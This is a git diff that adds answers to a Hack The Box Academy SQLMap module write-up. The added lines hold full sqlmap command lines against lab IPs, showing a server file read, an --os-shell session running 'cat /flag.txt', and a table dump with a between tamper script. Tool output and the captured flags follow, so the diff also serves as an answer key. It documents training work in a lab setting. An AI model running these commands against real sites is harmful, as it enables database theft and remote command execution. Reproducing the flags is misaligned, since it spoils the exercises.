@@ -5,7 +5,7 @@
 * Difficulty: Easy 
 * Category: Offensive
 * Time estimate: 8 hours
-* Date: DD-MM-YYYY
+* Date: 05-07-2022
 * Author: [DjikstraCS](https://github.com/DjikstraCS)
 
 
@@ -668,14 +668,52 @@ Table: flag11
 ### Question:
 ![](./attachments/Pasted%20image%2020220703120016.png)
 
-**Answer:** ``
+```
+──(kali㉿kali)-[~]
+└─$ sqlmap 'http://46.101.78.118:30316/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://46.101.78.118:30316/' -H 'Upgrade-Insecure-Requests: 1' --is-dba --batch
+(...)
+
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap 'http://46.101.78.118:30316/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://46.101.78.118:30316/' -H 'Upgrade-Insecure-Requests: 1' --file-read /var/www/html/flag.txt
+(...)
+[04:30:46] [INFO] the local file '/home/kali/.local/share/sqlmap/output/46.101.78.118/files/_var_www_html_flag.txt' and the remote file '/var/www/html/flag.txt' have the same size (31 B)
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/46.101.78.118/files/_var_www_html_flag.txt (same file)
+
+[04:30:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/46.101.78.118'
+
+[*] ending @ 04:30:46 /2022-07-05/
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat /home/kali/.local/share/sqlmap/output/46.101.78.118/files/_var_www_html_flag.txt
+HTB{5up3r_u53r5_4r3_p0w3rful!}
+```
+
+**Answer:** `HTB{5up3r_u53r5_4r3_p0w3rful!}`
  
 ### Question:
 ![](./attachments/Pasted%20image%2020220703120028.png)
 
 *Hint: The flag is in a very common directory!*
 
-**Answer:** ``
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap 'http://46.101.78.118:30316/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://46.101.78.118:30316/' -H 'Upgrade-Insecure-Requests: 1' --os-shell --technique=E
+
+(...)
+
+[04:39:32] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> cat /flag.txt
+do you want to retrieve the command standard output? [Y/n/a] 
+command standard output: 'HTB{n3v3r_run_db_45_db4}'
+```
+
+**Answer:** `HTB{n3v3r_run_db_45_db4}`
 
 ---
 ## Skills Assessment
@@ -684,7 +722,38 @@ Table: flag11
 
 *Hint: First, navigate the website to find potential attack vectors. Then, try to use various security bypassing techniques you learned to get SQL injection working.*
 
-**Answer:** ``
+![](./attachments/Pasted%20image%2020220705113649.png)
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap 'http://46.101.60.47:31094/action.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'Origin: https://46.101.60.47:31094' -H 'Connection: keep-alive' -H 'Referer: https://46.101.60.47:31094/shop.html' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"id":1}' --current-db --batch --no-cast
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap 'http://206.189.26.97:31220/action.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'Origin: https://46.101.60.47:31094' -H 'Connection: keep-alive' -H 'Referer: https://46.101.60.47:31094/shop.html' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"id":1}' --dump -T final_flag -D production --batch --no-cast --tamper=between
+
+(...)
+
+[06:31:05] [INFO] fetching entries for table 'final_flag' in database 'production'
+[06:31:05] [INFO] fetching number of entries for table 'final_flag' in database 'production'
+[06:31:05] [INFO] retrieved: 1
+[06:31:07] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                  
+HUB{n07_50_h4rd_r16h7?!}
+[06:32:54] [INFO] retrieved: 1
+Database: production
+Table: final_flag
+[1 entry]
++----+--------------------------+
+| id | content                  |
++----+--------------------------+
+| 1  | HUB{n07_50_h4rd_r16h7?!} |
++----+--------------------------+
+```
+
+Change `HUB` to `HTB`.
+
+**Answer:** `HTB{n07_50_h4rd_r16h7?!}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
